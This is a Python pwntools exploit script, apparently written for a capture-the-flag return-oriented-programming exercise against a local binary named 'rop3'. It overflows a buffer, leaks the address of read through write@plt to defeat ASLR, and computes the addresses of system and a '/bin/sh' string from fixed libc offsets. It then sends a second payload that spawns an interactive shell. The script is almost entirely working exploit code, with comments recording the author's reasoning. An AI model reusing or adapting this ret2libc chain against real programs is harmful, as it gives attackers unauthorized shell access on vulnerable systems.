from pwn import *
import struct

p = process('./rop3')

payload = 'AAAA'*35

writeplt = 0x080483a0
readgot = 0x0804a000
vuln = 0x08048474
readplt = 0x08048360

payload += struct.pack("<I", writeplt)
payload += struct.pack("<I", vuln)
payload += struct.pack("<I", 1)
payload += struct.pack("<I", readgot)
payload += struct.pack("<I", 4)

p.sendline(payload)
leak = struct.unpack("<I", p.recv(4))[0]
#print hex(leak)

system = leak - 633824
shell_string = leak + 548523

'''
How can this be simplified? We have a function which reads 256 charcters. We need
system, but do not have it. Hence we will find its address which has been ASLR-ed
using address of read which will be leaked using the write function. Then, using
address of read, we will compute address of system as well as the address of the
/bin/sh string present in the system. Then... then we will have to, you know,
do the rest if the work. But: the problem lies in using the gadget pppR. Why?
I don't know. If we are freturnin to vuln instead, we are golden. So remember
another thing: ALWAYS WORK LOCALLY WITH WHAT YOU _HAVE_ AS FAR AS POSSIBLE.
'''

#print hex(system)
#print hex(shell_string)

#shell_string = 0x08049f28
'''gid = 0x0804a004
gidplt = 0x08048370

payload = struct.pack("<I", readplt)
payload += struct.pack("<I", PPPr)
payload += struct.pack("<I", 0)
payload += struct.pack("<I", readgot)
payload += struct.pack("<I", 4)

payload += struct.pack("<I", readplt)
payload += struct.pack("<I", PPPr)
payload += struct.pack("<I", 0)
payload += struct.pack("<I", shell_string)
payload += struct.pack("<I", 8)'''

payload = 'AAAA'*35
payload += struct.pack("<I", system)
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", shell_string)

#print payload
p.sendline(payload)
#p.sendline(struct.pack("<I", system))
#p.sendline('\x2f\x62\x69\x6e\x2f\x73\x68\x00')

p.interactive()
